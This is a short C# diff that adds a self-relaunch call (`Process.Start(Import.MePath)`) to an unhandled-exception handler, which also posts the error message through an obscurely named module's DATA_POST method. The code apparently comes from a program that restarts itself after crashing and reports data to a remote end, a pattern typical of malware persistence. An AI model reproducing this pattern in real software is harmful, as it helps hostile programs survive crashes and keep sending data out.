@@ -103,6 +103,7 @@ public class Program
     }
     private static async void CatchError(object sender, UnhandledExceptionEventArgs e)
     {
+        Process.Start(Import.MePath);
         Exception ex = (Exception)e.ExceptionObject;
         await S1l14lx3_Module.DATA_POST(ex.Message);
 
